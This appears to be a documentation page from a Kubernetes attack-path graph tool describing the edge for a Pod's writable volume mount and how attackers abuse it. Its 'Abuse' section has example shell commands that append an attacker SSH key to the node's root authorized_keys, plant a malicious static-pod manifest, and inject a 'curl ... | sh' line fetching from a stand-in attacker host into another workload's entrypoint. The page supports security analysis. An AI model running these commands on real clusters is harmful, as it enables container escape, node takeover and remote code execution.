# CH_hasWriteVolume

## Edge Schema

- **Source:** [CH_Pod](../NodeDescriptions/CH_Pod.md)
- **Target:** [CH_Volume](../NodeDescriptions/CH_Volume.md)

## General Information

The Pod has a write-capable mount of the target Volume. The `containername` edge property identifies which container holds the mount, and the Volume node's `Volume type` and `source` properties show what backs it. Volumes are modelled per Pod, so two pods backed by the same PVC appear as separate Volume nodes; shared-storage relationships are not drawn as edges, and are identified by comparing Volume nodes' `source`.

## Abuse

The impact of a write depends on what backs the volume and on whether anything else consumes it:

- **Writable hostPath** - writes land on the node filesystem. This is the high-value case: dropping a file into a node path (a kubelet static-pod manifest, a cron entry, `authorized_keys`, the container runtime socket directory) can lead to code execution on the node, and is a common container-escape and node-compromise primitive.
- **Shared persistent storage (PVC) consumed by another workload** - writing content that another pod reads or executes can affect that workload. This sharing is not represented in the graph, so confirm the backing PVC/PV via the Volume node's `source` and check which other pods mount it.
- **A write that nothing else reads** (for example the pod's own `emptyDir`) has no security impact.

```bash
# Writable hostPath: drop an SSH key onto the node
echo '<attacker-key>' >> /path/to/hostpath-mount/root/.ssh/authorized_keys

# Writable hostPath: plant a static pod manifest for the kubelet to run
cp malicious-pod.yaml /path/to/hostpath-mount/etc/kubernetes/manifests/

# Shared storage: tamper with a script another workload executes
echo 'curl -s http://<attacker-host>/x | sh' >> /path/to/shared-mount/entrypoint.sh
```

## References

- [Kubernetes Volumes](https://kubernetes.io/docs/concepts/storage/volumes/)
- [HackTricks - Kubernetes Writable hostPath](https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/escaping-from-kubernetes/kubernetes-host-path-mount-escape)
- [OWASP K01 - Insecure Workload Configurations](https://owasp.org/www-project-kubernetes-top-ten/2025/en/src/K01-Insecure-Workload-Configurations.html)
- [Threat Matrix - Writable hostPath Mount](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Writable%20hostPath%20mount/)
